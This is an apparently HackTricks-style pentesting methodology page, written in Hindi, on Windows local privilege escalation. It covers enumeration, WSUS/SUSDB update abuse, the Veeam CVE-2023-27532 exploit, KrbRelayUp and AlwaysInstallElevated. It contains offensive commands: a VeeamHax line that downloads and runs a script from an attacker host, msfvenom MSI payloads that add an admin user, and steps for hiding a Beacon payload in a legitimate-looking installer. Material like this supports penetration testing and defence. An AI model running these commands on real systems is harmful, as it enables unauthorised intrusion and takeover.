# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

यह पेज कई बुनियादी गाइड्स से Windows privilege-escalation methodology को एक जगह समेटता है।<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> इसकी व्यावहारिक enumeration प्रक्रिया में community workshops और checklists से मिली जानकारी भी शामिल है।<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> इसमें ऐतिहासिक attack सामग्री के तौर पर Windows privilege escalation पर DerbyCon presentation भी शामिल है।<sup>[[5]](#references)</sup>

## Windows की शुरुआती जानकारी

### Access Tokens

**अगर आपको नहीं पता कि Windows access tokens क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए यह पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में ऐसी कई चीज़ें हैं जो **आपको system enumerate करने**, executables चलाने या आपकी गतिविधियों का **पता लगाने से रोक सकती हैं**। Privilege escalation enumeration शुरू करने से पहले आपको यह **पेज पढ़ना चाहिए** और इन सभी **defense mechanisms की enumeration करनी चाहिए**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physical access के ज़रिए offline UEFI NVRAM edit को pre-boot DMA और Windows `SYSTEM` memory-patching chain में भी बदला जा सकता है:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के ज़रिए launch की गई UIAccess processes का दुरुपयोग करके, AppInfo secure-path checks को bypass करने पर बिना prompts के High IL तक पहुँचा जा सकता है। UIAccess/Admin Protection bypass की विशेष workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग करके arbitrary SYSTEM registry write (RegPwn) किया जा सकता है:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows के हाल के builds में **SMB arbitrary-port** LPE path भी आया है, जहाँ privileged local NTLM authentication को reused SMB TCP connection के ज़रिए reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability तो नहीं है (लागू किए गए patches भी जाँचें)।

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Microsoft की security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए यह [site](https://msrc.microsoft.com/update-guide/vulnerability) उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो Windows environment के **विशाल attack surface** को दिखाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build, installed updates और चुने गए advisory candidates की सूची बनाता है; किसी नतीजे को लागू मानने से पहले exact product और superseding updates की पुष्टि करें।

किसी version-specific local exploit के लिए, OS architecture के साथ **running process architecture** भी जाँचें। 64-bit Windows पर, 32-bit process पर [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) लागू होता है: `%windir%\System32` आमतौर पर 32-bit system directory पर resolve होता है, जबकि `%windir%\Sysnative` उस process को native system directory तक पहुँच देता है। यह alias 64-bit process के लिए उपलब्ध नहीं है। OS build या missing-KB candidate से exploitability साबित नहीं होती; exact issue के [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) के साथ running build, installed या superseding update, process architecture और exploit prerequisites की तुलना करें।

**सिस्टम की जानकारी के साथ स्थानीय रूप से**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credentials/Juicy info सेव है?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell इतिहास

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript फ़ाइलें

आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में इसे चालू करने का तरीका जान सकते हैं।

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` केवल एक उदाहरण है। [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) आमतौर पर हर उपयोगकर्ता के Documents फ़ोल्डर में लिखती है, लेकिन `OutputDirectory` सेटिंग या `Start-Transcript -OutputDirectory` फ़ाइलों को किसी साझा या छिपे हुए फ़ोल्डर में भेज सकते हैं। किसी transcript की समीक्षा करने से पहले प्रभावी output path और फ़ाइल ACL जाँचें: इसमें command arguments और output हो सकते हैं, जिनमें credentials भी शामिल हैं। पढ़ा जा सकने वाला transcript तभी उपयोगी सुराग है, जब उसकी सामग्री किसी ऐसे उच्च-विशेषाधिकार वाले identity का खुलासा करे जिसका उपयोग किया जा सके और वह identity संबंधित context में log on कर सके।

### PowerShell Module Logging

PowerShell pipeline executions का विवरण रिकॉर्ड किया जाता है, जिसमें चलाए गए commands, command invocations और scripts के कुछ हिस्से शामिल होते हैं। हालाँकि, execution का पूरा विवरण और output के परिणाम शायद रिकॉर्ड न हों।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए गए निर्देशों का पालन करें और **"Powershell Transcription"** के बजाय **"Module Logging"** चुनें।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell logs से पिछले 15 events देखने के लिए, आप यह execute कर सकते हैं:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

स्क्रिप्ट के execution की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे कोड के हर ब्लॉक को चलते समय दर्ज किया जा सके। यह प्रक्रिया हर गतिविधि का व्यापक audit trail सुरक्षित रखती है, जो forensics और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए उपयोगी है। Execution के समय सभी गतिविधियों को दर्ज करके प्रक्रिया की विस्तृत जानकारी मिलती है।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block के लिए logging events, Windows Event Viewer में इस path पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
पिछले 20 events देखने के लिए, आप इसका उपयोग कर सकते हैं:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### इंटरनेट सेटिंग्स

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ड्राइव્સ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint, update-metadata interception की जांच के लिए एक शुरुआती संकेत है। Exploitation इस बात पर भी निर्भर करता है कि client उस WSUS server का उपयोग करता है या नहीं, attacker उसके traffic को intercept या control कर सकता है या नहीं, और client की update trust तथा installation policy क्या है। केवल URL से code execution साबित नहीं होता। [Microsoft, WSUS metadata के लिए TLS की अनुशंसा करता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

शुरुआत में, cmd में नीचे दिया गया command चलाकर जांचें कि network non-SSL WSUS update का उपयोग करता है या नहीं:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

या PowerShell में निम्नलिखित:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

यदि आपको इनमें से कोई जवाब मिलता है:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

जब `UseWUServer` का मान `1` होता है, तो Windows Update कॉन्फ़िगर की गई intranet service का उपयोग करता है। यह HTTP interception path के लिए एक prerequisite की पुष्टि करता है, लेकिन यह साबित नहीं करता कि interception, malicious update की स्वीकृति या elevated installation संभव है। जब इसका मान `0` होता है, तो उस policy के अनुसार यह कॉन्फ़िगर किया गया WSUS endpoint चयनित नहीं होता।

इन vulnerabilities का exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं—ये MiTM weaponized exploit scripts हैं, जो non-SSL WSUS traffic में 'fake' updates inject करते हैं।

यहाँ research पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
मूल रूप से, यह वही flaw है जिसका यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की क्षमता है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हमारे पास अपने ही traffic को intercept करने के लिए [PyWSUS](https://github.com/GoSecure/pywsus) को local रूप से चलाने और अपने asset पर elevated user के रूप में code चलाने की क्षमता होगी।
>
> इसके अलावा, चूँकि WSUS service मौजूदा user की settings का उपयोग करती है, इसलिए यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate बनाकर उसे मौजूदा user के certificate store में जोड़ दें, तो हम HTTP और HTTPS—दोनों तरह के WSUS traffic को intercept कर सकेंगे। WSUS, certificate पर trust-on-first-use type validation लागू करने के लिए HSTS-जैसे mechanisms का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और उसका hostname सही है, तो service उसे स्वीकार कर लेगी।

इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool से exploit किया जा सकता है (जब यह उपलब्ध हो जाए)।

### WSUS administrator द्वारा नियंत्रित updates

एक अलग path तब मौजूद होता है जब मौजूदा identity के पास WSUS server पर updates **publish और approve** करने की क्षमता हो। Server के `WSUS Administrators` group की effective membership और किसी भी delegated WSUS permissions की जाँच करें, फिर पहचानें कि approved update किस client computer group को मिलेगा। [Microsoft के अनुसार, updates approve करने के लिए WSUS Administrator privileges आवश्यक हैं](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), और [वह publishing trust relationship का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients को locally published content के लिए उपयोग किए गए signing certificate पर trust करना होगा। इस path को escalation path मानने से पहले पुष्टि करें कि candidate update signed और accepted है, target पर लागू होता है, और अधिक privileged context में install होता है। केवल HTTP `WUServer` value या group name से ये शर्तें सिद्ध नहीं होतीं।

### SUSDB custom-update abuse: `.txt`/`.esd` के ज़रिए unsigned payloads

यह HTTP WSUS connection को intercept करने से अलग trust-boundary failure है: इसके लिए **WSUS database (`SUSDB`) stored procedures** तक इतनी access आवश्यक है कि custom update publish और approve किया जा सके। एक व्यावहारिक entry path में upstream WSUS computer account को अलग MSSQL server पर relay करना शामिल है, जो `SUSDB` host करता है; सटीक prerequisite deployment पर निर्भर करती है, इसलिए SQL administrator rights मानने के बजाय पहले `EXECUTE` permissions enumerate करें।<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 से LDAP, SMB या AD CS तक WSUS client authentication relay करने वाले अलग attack path के लिए, [NTLM relay के लिए WSUS HTTP का दुरुपयोग](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) देखें।

#### Update बनाएँ, target करें और approve करें

Custom-update workflow, restricted publishing API के रूप में legitimate WSUS procedures का उपयोग करता है। मुख्य state transitions ये हैं:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Update metadata import करें | `spImportUpdate` |
| Prerequisite, localized और extended XML fragments store करें | `spSaveXMLFragment` |
| Content digest को attacker-controlled URL से associate करें | `spSetBatchURL` |
| Computer group enumerate/create करें और client जोड़ें | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| उस group के लिए installation approve करें | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

Imported metadata/fragments में file name, digests, size और `CommandLineInstallation` handler का आपस में मेल खाना आवश्यक है। Content URL और target group assign करने के बाद, अंतिम approval कुछ इस तरह दिखता है; उदाहरण के GUIDs को दोबारा इस्तेमाल करने के बजाय नए update, group और deployment identifiers का उपयोग करें।<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS सामान्यतः मनमाने unsigned executable content को अस्वीकार करता है। हालांकि, `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` में, .NET का `VerifyFile` पथ supplied filename के `.txt` या `.esd` पर समाप्त होने पर certificate-check flag को false सेट कर देता है; `CheckCertificateSignature` को यह साबित किए बिना छोड़ दिया जाता है कि bytes टेक्स्ट हैं या वैध ESD image। इसलिए, उदाहरण के लिए `payload.exe.txt` नाम वाला अपरिवर्तित PE content verification पास कर सकता है और बाद में update के command-line installation handler द्वारा launch किया जा सकता है। यह signature forgery नहीं, बल्कि policy/type-confusion bug है।<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-संगत staging और automation

`spDeployUpdate` को कॉल करने से WSUS पंजीकृत content fetch करता है। Origin को BITS की HTTP अपेक्षाएँ पूरी करनी होंगी: केवल एक reachable URL पर्याप्त नहीं है, क्योंकि transfer में शुरुआती `HEAD`/`GET` flow और byte-range requests का उपयोग होता है। Range support के बिना सर्वर, WSUS synchronization में `EventId=364` देता है, जिसमें बताया जाता है कि BITS को Range protocol header चाहिए।<sup>[[39]](#references)</sup>

रिसर्च PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment chain के लिए ज़रूरी SQL generate करता है, उसे execute करने के लिए modified MSSQL client शामिल करता है, और content staging के लिए `BitsWebServer.py` भी देता है। अधिकृत lab में इसका न्यूनतम invocation यह है:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### बिना निगरानी के execution और retry persistence

Client-side interaction policy पर निर्भर करता है। `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` में विकल्प `4 - Auto download and schedule install` से स्वीकृत update configured schedule के अनुसार download और install होता है, बिना उपयोगकर्ता द्वारा उसे मैन्युअल रूप से चुनने के। Testing में, जिस payload का update failed/incomplete बना रहा, callback process के exit होते ही उसे फिर से तुरंत पेश किया गया। इसलिए retry behavior बार-बार होने वाली execution persistence बन सकता है; यह आसानी से दिखाई देता है, क्योंकि client update-failed state दिखाता है।<sup>[[39]](#references)</sup>

#### Detection और hardening pivots

इस chain से जुड़े उपयोगी server- और client-side pivots हैं:<sup>[[39]](#references)</sup>

- `SUSDB` में `spCreateTargetGroup`, `spSetBatchURL` और `spDeployUpdate` के execution का audit करें; नए targeting groups, external content origins, `.txt`/`.esd` update payloads और unexpected principals (खासकर non-computer accounts) द्वारा किए गए deployments की जाँच करें।
- `C:\Program Files\Update Services\LogFiles` में `ContentSyncAgent`, `FileVerified`, गलत वर्तनी वाला `FileVerficationFailed` और `EventId=364` खोजें; verification को payload extension और content magic से मिलाएँ, suffix पर भरोसा न करें।
- Windows Update installation के बार-बार fail/retry होने की जाँच करें। ऐसे content से PE execution या अनपेक्षित child/network activity भी खोजें, जिसके नाम में `.txt` या `.esd` हो।
- जहाँ समर्थित हो, database service पर Extended Protection for Authentication अनिवार्य करें और database network access को WSUS server तथा अधिकृत administrative systems तक सीमित रखें। Custom-update procedures पर `EXECUTE` rights कम से कम रखें और उनका audit करें।

## Third-Party Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel उपलब्ध कराते हैं। यदि enrollment को attacker server की ओर मोड़ा जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करे, तो local user एक malicious MSI भेज सकता है, जिसे SYSTEM service install कर देती है। एक सामान्यीकृत technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 के ज़रिए SYSTEM)

Veeam Backup & Replication और Cloud Connect, **डिफ़ॉल्ट रूप से TCP/9401** पर core backup service का उपयोग करते हैं। [Veeam की advisory](https://www.veeam.com/kb4424) backup network perimeter के भीतर encrypted configuration-database credentials के unauthenticated disclosure का वर्णन करती है; एक अलग सार्वजनिक PoC, **NT AUTHORITY\SYSTEM** के रूप में command-execution path दिखाता है।<sup>[[12]](#references)</sup> Service localhost से आगे भी bind हो सकती है, इसलिए उसका वास्तविक address और PID जाँचें।

- **Recon**: पुष्टि करें कि TCP/9401, `Veeam.Backup.Service.exe` का है, फिर installed product और patch metadata देखें। `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` संकेत हैं, पूर्ण patch check नहीं।
- **Fixed floors**: Veeam, **11a build 11.0.1.1261 P20230227** और **12 build 12.0.0.1420 P20230223** को पहली fixed releases के रूप में सूचीबद्ध करता है; इससे पहले की releases प्रभावित हैं। केवल चार-भाग वाला file version, उन्हीं build numbers पर unpatched base build और बाद के patch में अंतर नहीं बता सकता। किसी boundary build को fixed मानने से पहले, [vendor build history](https://www.veeam.com/kb2680) से patch identifier की पुष्टि करें।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC को उसी directory में रखें, फिर local socket के ज़रिए SYSTEM payload trigger करें:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

उद्धृत PoC दिखाता है कि इसकी अतिरिक्त पूर्व-आवश्यकताएँ पूरी होने पर SYSTEM के रूप में command execution किया जा सकता है; vendor की advisory credential-disclosure समस्या का वर्णन करती है।
## KrbRelayUp

स्थानीय Kerberos relay, कम विशेषाधिकार वाले logon से विशेषाधिकार-युक्त directory write तक पहुँच सकता है, जब कोई उपयुक्त COM server authenticate करे और relayed principal को target object पर अधिकार प्राप्त हों। [KrbRelay documents](https://github.com/cube0x0/KrbRelay) RBCD और `msDS-KeyCredentialLink` (shadow-credential) LDAP writes—दोनों का दस्तावेज़ीकरण करता है; KrbRelayUp इनमें से कुछ paths को automate करता है। RBCD chain के लिए लागू delegation और target-object अधिकार आवश्यक हैं, जबकि shadow-credential chain के लिए key-credential write अधिकार और certificate authentication path को support करने वाला KDC आवश्यक है। केवल domain membership से इनमें से कोई भी path उपलब्ध नहीं होता।

वास्तविक DC की [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) और [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, relayed identity का object ACL, और चुनी गई COM class के authentication तथा impersonation levels जाँचें। Caller का logon type और credential context मायने रखते हैं: WinRM session, interactive या new-credentials logon से अलग व्यवहार कर सकता है। Firewall/OXID routing और installed updates भी परिणाम बदल सकते हैं। Permissive policy या मेल खाता ACL मिलने पर उसे समीक्षा के लिए संभावित मुद्दा मानें; passive enumeration से COM coercion, relay authentication या directory writes शुरू नहीं होने चाहिए। Machine-account shadow credential से machine ticket मिल सकता है और, केवल तभी जब उस account के पास आवश्यक directory replication अधिकार हों, अलग DCSync path संभव है।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में **exploit ढूँढें**

Attack के flow के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**यदि** ये 2 registry keys **enabled** हैं (value **0x1** है), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

यदि आपके पास meterpreter session है, तो आप module **`exploit/windows/local/always_install_elevated`** का उपयोग करके इस technique को automate कर सकते हैं।

### PowerUP

Power-up के `Write-UserAddMSI` command का उपयोग करके, privileges escalate करने के लिए current directory में Windows MSI binary बनाएँ। यह script एक precompiled MSI installer लिखती है, जो user/group जोड़ने के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):

```
Write-UserAddMSI
```

बनाई गई binary को privileges escalate करने के लिए बस execute करें।

### MSI Wrapper

इस tools का उपयोग करके MSI wrapper बनाना सीखने के लिए यह tutorial पढ़ें। ध्यान दें कि अगर आप **सिर्फ** **command lines** **execute** करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं।


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX से MSI बनाएँ


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio से MSI बनाएँ

- Cobalt Strike या Metasploit से `C:\privesc\beacon.exe` में एक **नया Windows EXE TCP payload** **generate** करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" type करें। **Setup Wizard** project चुनें और **Next** पर click करें।
- Project का नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें और **Create** पर click करें।
- **Next** पर click करते रहें, जब तक आप step 3 of 4 (शामिल करने के लिए files चुनें) तक न पहुँच जाएँ। **Add** पर click करें और अभी generate किया गया Beacon payload चुनें। फिर **Finish** पर click करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
  - आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate दिख सकती है।
- Project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर click करें। इससे यह सुनिश्चित होगा कि installer चलाते ही beacon payload execute हो जाए।
- **Custom Action Properties** में, **Run64Bit** को **True** में बदलें।
- अंत में, **build करें**।
  - अगर चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो पक्का करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

malicious `.msi` file को **background** में **install** करने के लिए:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

इस vulnerability का exploit करने के लिए आप इसका उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus और Detectors

### Audit Settings

ये settings तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको इन पर ध्यान देना चाहिए.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding में यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं।

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** को **local Administrator passwords के management** के लिए डिज़ाइन किया गया है। यह सुनिश्चित करता है कि domain से जुड़े कंप्यूटरों पर हर password **अलग, randomised और नियमित रूप से अपडेट** किया जाए। ये passwords Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और इन्हें केवल वे users access कर सकते हैं जिन्हें ACLs के ज़रिए पर्याप्त permissions दी गई हों। इससे वे अनुमति होने पर local admin passwords देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

अगर यह सक्रिय है, तो **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में संग्रहीत होते हैं।\
[**इस पेज पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** से शुरू करते हुए, Microsoft ने Local Security Authority (LSA) के लिए बेहतर सुरक्षा शुरू की, ताकि अविश्वसनीय processes द्वारा इसकी **memory पढ़ने** या code inject करने के प्रयासों को **block** किया जा सके और system को और सुरक्षित बनाया जा सके।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

